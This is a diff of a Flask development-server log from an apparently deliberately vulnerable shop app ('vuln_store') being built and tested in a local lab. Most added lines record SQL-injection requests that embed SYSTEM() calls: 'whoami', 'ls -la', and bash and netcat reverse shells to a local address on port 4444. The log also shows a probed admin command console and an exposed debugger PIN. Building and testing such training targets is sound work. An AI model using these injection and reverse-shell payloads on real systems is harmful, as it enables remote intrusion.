@@ -1396,3 +1396,923 @@
 2025-08-15 22:49:06,108 - 192.168.0.242 - - [15/Aug/2025 22:49:06] "GET / HTTP/1.1" 200 -
 2025-08-15 22:49:06,563 - 192.168.0.242 - - [15/Aug/2025 22:49:06] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
 2025-08-15 22:49:10,805 - 192.168.0.242 - - [15/Aug/2025 22:49:10] "GET /products HTTP/1.1" 200 -
+2025-08-15 23:24:36,507 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.245:5000
+2025-08-15 23:24:36,507 - [33mPress CTRL+C to quit[0m
+2025-08-15 23:24:36,510 -  * Restarting with stat
+2025-08-15 23:24:36,705 -  * Debugger is active!
+2025-08-15 23:24:36,706 -  * Debugger PIN: 130-425-084
+2025-08-15 23:24:43,605 - 192.168.0.241 - - [15/Aug/2025 23:24:43] "GET / HTTP/1.1" 200 -
+2025-08-15 23:24:43,917 - 192.168.0.241 - - [15/Aug/2025 23:24:43] "GET /static/icons/favicon-32x32.png HTTP/1.1" 200 -
+2025-08-15 23:24:45,399 - 192.168.0.241 - - [15/Aug/2025 23:24:45] "GET /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-15 23:24:47,200 - ADMIN_CONSOLE Timestamp: 2025-08-15 23:24:47IP: 192.168.0.241 | Payload: {'user': 'admin', 'command': 'whoami', 'output': 'Error: Command not allowed or invalid - whoami', 'allowed': False, 'ip': '192.168.0.241'} | 
+2025-08-15 23:24:47,201 - 192.168.0.241 - - [15/Aug/2025 23:24:47] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-15 23:25:26,855 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/admin.py', reloading
+2025-08-15 23:25:26,886 -  * Restarting with stat
+2025-08-15 23:25:27,108 -  * Debugger is active!
+2025-08-15 23:25:27,109 -  * Debugger PIN: 130-425-084
+2025-08-15 23:25:29,524 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.245:5000
+2025-08-15 23:25:29,525 - [33mPress CTRL+C to quit[0m
+2025-08-15 23:25:29,525 -  * Restarting with stat
+2025-08-15 23:25:29,722 -  * Debugger is active!
+2025-08-15 23:25:29,723 -  * Debugger PIN: 130-425-084
+2025-08-15 23:25:32,857 - ADMIN_CONSOLE Timestamp: 2025-08-15 23:25:32IP: 192.168.0.242 | Payload: {'user': 'admin', 'command': 'whoami', 'output': 'Error: Command not allowed or invalid - whoami', 'allowed': False, 'ip': '192.168.0.242'} | 
+2025-08-15 23:25:32,872 - 192.168.0.242 - - [15/Aug/2025 23:25:32] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-15 23:25:33,004 - 192.168.0.242 - - [15/Aug/2025 23:25:33] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 11:56:23,162 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.245:5000
+2025-08-16 11:56:23,163 - [33mPress CTRL+C to quit[0m
+2025-08-16 11:56:23,163 -  * Restarting with stat
+2025-08-16 11:56:23,365 -  * Debugger is active!
+2025-08-16 11:56:23,366 -  * Debugger PIN: 130-425-084
+2025-08-16 11:56:31,543 - 192.168.0.242 - - [16/Aug/2025 11:56:31] "GET / HTTP/1.1" 200 -
+2025-08-16 11:56:33,714 - 192.168.0.242 - - [16/Aug/2025 11:56:33] "GET /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 11:56:36,128 - ADMIN_CONSOLE Timestamp: 2025-08-16 11:56:36IP: 192.168.0.242 | Payload: {'user': 'admin', 'command': 'whoami', 'output': 'Error: Command not allowed or invalid - whoami', 'allowed': False, 'ip': '192.168.0.242'} | 
+2025-08-16 11:56:36,129 - 192.168.0.242 - - [16/Aug/2025 11:56:36] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 11:57:20,542 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/admin.py', reloading
+2025-08-16 11:57:20,569 -  * Restarting with stat
+2025-08-16 11:57:20,784 -  * Debugger is active!
+2025-08-16 11:57:20,785 -  * Debugger PIN: 130-425-084
+2025-08-16 11:57:29,961 - 192.168.0.242 - - [16/Aug/2025 11:57:29] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 11:57:30,077 - 192.168.0.242 - - [16/Aug/2025 11:57:30] "GET /static/icons/favicon-32x32.png HTTP/1.1" 200 -
+2025-08-16 11:57:33,704 - 192.168.0.242 - - [16/Aug/2025 11:57:33] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 11:57:52,803 - 192.168.0.242 - - [16/Aug/2025 11:57:52] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 11:57:52,915 - 192.168.0.242 - - [16/Aug/2025 11:57:52] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:00:00,283 - 192.168.0.242 - - [16/Aug/2025 12:00:00] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:00:16,294 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/admin.py', reloading
+2025-08-16 12:00:16,325 -  * Restarting with stat
+2025-08-16 12:00:16,536 -  * Debugger is active!
+2025-08-16 12:00:16,537 -  * Debugger PIN: 130-425-084
+2025-08-16 12:00:22,565 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/admin.py', reloading
+2025-08-16 12:00:22,591 -  * Restarting with stat
+2025-08-16 12:00:22,789 -  * Debugger is active!
+2025-08-16 12:00:22,790 -  * Debugger PIN: 130-425-084
+2025-08-16 12:00:31,141 - 192.168.0.242 - - [16/Aug/2025 12:00:31] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:00:31,264 - 192.168.0.242 - - [16/Aug/2025 12:00:31] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:00:33,838 - 192.168.0.242 - - [16/Aug/2025 12:00:33] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:00:38,227 - 192.168.0.242 - - [16/Aug/2025 12:00:38] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:00:49,018 - 192.168.0.242 - - [16/Aug/2025 12:00:49] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:01:45,038 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/admin.py', reloading
+2025-08-16 12:01:45,068 -  * Restarting with stat
+2025-08-16 12:01:45,268 -  * Debugger is active!
+2025-08-16 12:01:45,269 -  * Debugger PIN: 130-425-084
+2025-08-16 12:01:47,594 - 192.168.0.242 - - [16/Aug/2025 12:01:47] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:01:49,422 - 192.168.0.242 - - [16/Aug/2025 12:01:49] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:02:03,904 - 192.168.0.242 - - [16/Aug/2025 12:02:03] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:02:36,430 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/admin.py', reloading
+2025-08-16 12:02:36,463 -  * Restarting with stat
+2025-08-16 12:02:36,695 -  * Debugger is active!
+2025-08-16 12:02:36,696 -  * Debugger PIN: 130-425-084
+2025-08-16 12:02:41,043 - 192.168.0.242 - - [16/Aug/2025 12:02:41] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:02:41,169 - 192.168.0.242 - - [16/Aug/2025 12:02:41] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:02:50,121 - 192.168.0.242 - - [16/Aug/2025 12:02:50] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:03:02,565 - 192.168.0.242 - - [16/Aug/2025 12:03:02] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:03:02,673 - 192.168.0.242 - - [16/Aug/2025 12:03:02] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:03:05,098 - 192.168.0.242 - - [16/Aug/2025 12:03:05] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:03:06,304 - 192.168.0.242 - - [16/Aug/2025 12:03:06] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:03:07,418 - 192.168.0.242 - - [16/Aug/2025 12:03:07] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:03:09,806 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/admin.py', reloading
+2025-08-16 12:03:09,845 -  * Restarting with stat
+2025-08-16 12:03:10,055 -  * Debugger is active!
+2025-08-16 12:03:10,055 -  * Debugger PIN: 130-425-084
+2025-08-16 12:03:15,147 - 192.168.0.242 - - [16/Aug/2025 12:03:15] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:03:16,892 - 192.168.0.242 - - [16/Aug/2025 12:03:16] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:03:18,225 - 192.168.0.242 - - [16/Aug/2025 12:03:18] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:03:44,163 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/admin.py', reloading
+2025-08-16 12:03:44,192 -  * Restarting with stat
+2025-08-16 12:03:44,392 -  * Debugger is active!
+2025-08-16 12:03:44,393 -  * Debugger PIN: 130-425-084
+2025-08-16 12:03:46,466 - 192.168.0.242 - - [16/Aug/2025 12:03:46] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:03:46,580 - 192.168.0.242 - - [16/Aug/2025 12:03:46] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:03:54,016 - 192.168.0.242 - - [16/Aug/2025 12:03:54] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:03:56,929 - 192.168.0.242 - - [16/Aug/2025 12:03:56] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:03:58,556 - 192.168.0.242 - - [16/Aug/2025 12:03:58] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:05:11,851 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.245:5000
+2025-08-16 12:05:11,851 - [33mPress CTRL+C to quit[0m
+2025-08-16 12:05:11,852 -  * Restarting with stat
+2025-08-16 12:05:12,055 -  * Debugger is active!
+2025-08-16 12:05:12,056 -  * Debugger PIN: 130-425-084
+2025-08-16 12:05:15,332 - 192.168.0.242 - - [16/Aug/2025 12:05:15] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:05:15,452 - 192.168.0.242 - - [16/Aug/2025 12:05:15] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:08:36,297 - 192.168.0.242 - - [16/Aug/2025 12:08:36] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:26:07,213 - 192.168.0.242 - - [16/Aug/2025 12:26:07] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:26:07,517 - 192.168.0.242 - - [16/Aug/2025 12:26:07] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:26:22,521 - 192.168.0.242 - - [16/Aug/2025 12:26:22] "GET /products HTTP/1.1" 200 -
+2025-08-16 12:26:26,400 - System error: SELECTs to the left and right of UNION do not have the same number of result columns
+2025-08-16 12:26:26,401 - 192.168.0.242 - - [16/Aug/2025 12:26:26] "GET /products?search='+UNION+SELECT+1,system('whoami')-- HTTP/1.1" 200 -
+2025-08-16 12:26:45,213 - System error: no such table: dual
+2025-08-16 12:26:45,213 - 192.168.0.242 - - [16/Aug/2025 12:26:45] "GET /products?search=a'+UNION+SELECT+1,SYSTEM('bash+-i+>%26+/dev/tcp/192.168.0.245/4444+0>%261'),3,4,5,'image.jpg'+FROM+dual-- HTTP/1.1" 200 -
+2025-08-16 12:26:56,368 - 192.168.0.241 - - [16/Aug/2025 12:26:56] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:27:12,513 - 192.168.0.242 - - [16/Aug/2025 12:27:12] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:31:07,661 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 12:31:07,690 -  * Restarting with stat
+2025-08-16 12:31:07,918 -  * Debugger is active!
+2025-08-16 12:31:07,919 -  * Debugger PIN: 130-425-084
+2025-08-16 12:31:27,854 - 192.168.0.242 - - [16/Aug/2025 12:31:27] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:31:28,229 - 192.168.0.242 - - [16/Aug/2025 12:31:28] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:31:33,024 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.245:5000
+2025-08-16 12:31:33,024 - [33mPress CTRL+C to quit[0m
+2025-08-16 12:31:33,025 -  * Restarting with stat
+2025-08-16 12:31:33,240 -  * Debugger is active!
+2025-08-16 12:31:33,240 -  * Debugger PIN: 130-425-084
+2025-08-16 12:31:34,402 - 192.168.0.242 - - [16/Aug/2025 12:31:34] "GET / HTTP/1.1" 200 -
+2025-08-16 12:31:36,565 - 192.168.0.242 - - [16/Aug/2025 12:31:36] "GET /products HTTP/1.1" 200 -
+2025-08-16 12:32:07,679 - System error: no such table: dual
+2025-08-16 12:32:07,680 - 192.168.0.242 - - [16/Aug/2025 12:32:07] "GET /products?search=a'+UNION+SELECT+1,SYSTEM('bash+-i+>%26+/dev/tcp/192.168.0.245/4444+0>%261'),3,4,5,'image.jpg'+FROM+dual-- HTTP/1.1" 200 -
+2025-08-16 12:32:40,452 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 12:32:40,479 -  * Restarting with stat
+2025-08-16 12:32:40,686 -  * Debugger is active!
+2025-08-16 12:32:40,687 -  * Debugger PIN: 130-425-084
+2025-08-16 12:32:53,076 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:32:53,104 - 192.168.0.242 - - [16/Aug/2025 12:32:53] "GET /products?search=a'+UNION+SELECT+1,SYSTEM('bash+-i+>%26+/dev/tcp/192.168.0.245/4444+0>%261'),3,4,5,'image.jpg'+FROM+dual-- HTTP/1.1" 200 -
+2025-08-16 12:32:53,190 - 192.168.0.242 - - [16/Aug/2025 12:32:53] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:32:54,307 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:32:54,314 - 192.168.0.242 - - [16/Aug/2025 12:32:54] "GET /products?search=a'+UNION+SELECT+1,SYSTEM('bash+-i+>%26+/dev/tcp/192.168.0.245/4444+0>%261'),3,4,5,'image.jpg'+FROM+dual-- HTTP/1.1" 200 -
+2025-08-16 12:33:06,662 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:33:06,668 - 192.168.0.242 - - [16/Aug/2025 12:33:06] "GET /products?search=a'+UNION+SELECT+1,SYSTEM('bash+-i+>%26+/dev/tcp/192.168.0.245/4444+0>%261'),3,4,5,'image.jpg'+FROM+dual-- HTTP/1.1" 200 -
+2025-08-16 12:33:11,912 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:33:11,918 - 192.168.0.242 - - [16/Aug/2025 12:33:11] "GET /products?search=a'+UNION+SELECT+1,SYSTEM('bash+-i+>%26+/dev/tcp/192.168.0.245/4444+0>%261'),3,4,5,'image.jpg'+FROM+dual-- HTTP/1.1" 200 -
+2025-08-16 12:33:12,524 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:33:12,530 - 192.168.0.242 - - [16/Aug/2025 12:33:12] "GET /products?search=a'+UNION+SELECT+1,SYSTEM('bash+-i+>%26+/dev/tcp/192.168.0.245/4444+0>%261'),3,4,5,'image.jpg'+FROM+dual-- HTTP/1.1" 200 -
+2025-08-16 12:33:13,041 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:33:13,047 - 192.168.0.242 - - [16/Aug/2025 12:33:13] "GET /products?search=a'+UNION+SELECT+1,SYSTEM('bash+-i+>%26+/dev/tcp/192.168.0.245/4444+0>%261'),3,4,5,'image.jpg'+FROM+dual-- HTTP/1.1" 200 -
+2025-08-16 12:33:13,988 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:33:13,995 - 192.168.0.242 - - [16/Aug/2025 12:33:13] "GET /products?search=a'+UNION+SELECT+1,SYSTEM('bash+-i+>%26+/dev/tcp/192.168.0.245/4444+0>%261'),3,4,5,'image.jpg'+FROM+dual-- HTTP/1.1" 200 -
+2025-08-16 12:33:14,055 - 192.168.0.242 - - [16/Aug/2025 12:33:14] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:33:15,171 - 192.168.0.242 - - [16/Aug/2025 12:33:15] "GET /browse_files HTTP/1.1" 200 -
+2025-08-16 12:33:16,348 - 192.168.0.242 - - [16/Aug/2025 12:33:16] "GET /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 12:33:17,228 - 192.168.0.242 - - [16/Aug/2025 12:33:17] "GET /products HTTP/1.1" 200 -
+2025-08-16 12:33:20,750 - Command processing error: list index out of range
+2025-08-16 12:33:20,751 - 192.168.0.242 - - [16/Aug/2025 12:33:20] "GET /products?search='+UNION+SELECT+1,system('whoami')-- HTTP/1.1" 200 -
+2025-08-16 12:33:27,695 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:33:31,175 - 192.168.0.241 - - [16/Aug/2025 12:33:31] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:33:36,307 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:33:44,473 - 192.168.0.242 - - [16/Aug/2025 12:33:44] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:33:51,100 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:33:51,108 - 192.168.0.242 - - [16/Aug/2025 12:33:51] "GET /products?search='+UNION+SELECT+1,SYSTEM(whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:33:56,304 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:33:56,374 - 192.168.0.242 - - [16/Aug/2025 12:33:56] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:34:18,991 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:34:18,997 - 192.168.0.241 - - [16/Aug/2025 12:34:18] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami')FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:34:22,812 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:34:22,817 - 192.168.0.242 - - [16/Aug/2025 12:34:22] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami')-- HTTP/1.1" 200 -
+2025-08-16 12:34:35,006 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:34:35,084 - 192.168.0.241 - - [16/Aug/2025 12:34:35] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:34:36,842 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:34:36,912 - 192.168.0.241 - - [16/Aug/2025 12:34:36] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 12:35:23,774 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:35:23,863 - 192.168.0.241 - - [16/Aug/2025 12:35:23] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('ls+-la')+-- HTTP/1.1" 200 -
+2025-08-16 12:35:25,157 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:35:25,270 - 192.168.0.241 - - [16/Aug/2025 12:35:25] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('ls+-la')+-- HTTP/1.1" 200 -
+2025-08-16 12:35:25,894 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:35:25,989 - 192.168.0.241 - - [16/Aug/2025 12:35:25] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('ls+-la')+-- HTTP/1.1" 200 -
+2025-08-16 12:35:37,234 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:35:37,321 - 192.168.0.241 - - [16/Aug/2025 12:35:37] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('ls+-la')+-- HTTP/1.1" 200 -
+2025-08-16 12:35:37,876 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:35:37,972 - 192.168.0.242 - - [16/Aug/2025 12:35:37] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('ls+-la')+-- HTTP/1.1" 200 -
+2025-08-16 12:35:38,255 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:35:38,355 - 192.168.0.242 - - [16/Aug/2025 12:35:38] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('ls+-la')+-- HTTP/1.1" 200 -
+2025-08-16 12:35:38,697 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:35:38,811 - 192.168.0.242 - - [16/Aug/2025 12:35:38] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('ls+-la')+-- HTTP/1.1" 200 -
+2025-08-16 12:35:38,822 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:35:38,920 - 192.168.0.242 - - [16/Aug/2025 12:35:38] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('ls+-la')+-- HTTP/1.1" 200 -
+2025-08-16 12:35:46,431 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:35:46,438 - 192.168.0.242 - - [16/Aug/2025 12:35:46] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM(whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:35:50,828 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:35:50,900 - 192.168.0.242 - - [16/Aug/2025 12:35:50] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:36:36,752 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:36:36,819 - 192.168.0.242 - - [16/Aug/2025 12:36:36] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:37:03,924 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:37:03,996 - 192.168.0.242 - - [16/Aug/2025 12:37:03] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:37:04,270 - 192.168.0.242 - - [16/Aug/2025 12:37:04] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-16 12:37:05,354 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:37:05,430 - 192.168.0.242 - - [16/Aug/2025 12:37:05] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:37:06,657 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:37:06,734 - 192.168.0.242 - - [16/Aug/2025 12:37:06] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:37:07,364 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:37:07,443 - 192.168.0.242 - - [16/Aug/2025 12:37:07] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:37:07,793 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:37:07,884 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:37:07,895 - 192.168.0.242 - - [16/Aug/2025 12:37:07] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:37:07,960 - 192.168.0.242 - - [16/Aug/2025 12:37:07] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:37:08,351 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:37:08,431 - 192.168.0.242 - - [16/Aug/2025 12:37:08] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:37:48,683 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 12:37:48,735 -  * Restarting with stat
+2025-08-16 12:37:48,939 -  * Debugger is active!
+2025-08-16 12:37:48,940 -  * Debugger PIN: 130-425-084
+2025-08-16 12:37:58,974 - 192.168.0.242 - - [16/Aug/2025 12:37:58] "GET / HTTP/1.1" 200 -
+2025-08-16 12:38:00,621 - 192.168.0.242 - - [16/Aug/2025 12:38:00] "GET /products HTTP/1.1" 200 -
+2025-08-16 12:38:03,732 - Command processing error: list index out of range
+2025-08-16 12:38:03,733 - 192.168.0.242 - - [16/Aug/2025 12:38:03] "GET /products?search='+UNION+SELECT+1,system('whoami')-- HTTP/1.1" 200 -
+2025-08-16 12:38:17,451 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:38:17,521 - 192.168.0.241 - - [16/Aug/2025 12:38:17] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM('whoami')+-- HTTP/1.1" 200 -
+2025-08-16 12:38:36,603 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:38:36,608 - 192.168.0.242 - - [16/Aug/2025 12:38:36] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM(whoami)+-- HTTP/1.1" 200 -
+2025-08-16 12:38:41,354 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:38:41,425 - 192.168.0.242 - - [16/Aug/2025 12:38:41] "GET /products?search='+UNION+SELECT+1,2,3,4,5,6,7,8+FROM+products+WHERE+1%3D1+AND+SYSTEM("whoami")+-- HTTP/1.1" 200 -
+2025-08-16 12:39:01,145 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 12:39:01,215 - 192.168.0.242 - - [16/Aug/2025 12:39:01] "GET /products?search='%20UNION%20SELECT%201,2,3,4,5,6,7,8%20FROM%20products%20WHERE%201=1%20AND%20SYSTEM('whoami')%20-- HTTP/1.1" 200 -
+2025-08-16 12:41:34,602 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-16 12:41:34,658 -  * Restarting with stat
+2025-08-16 12:41:34,882 -  * Debugger is active!
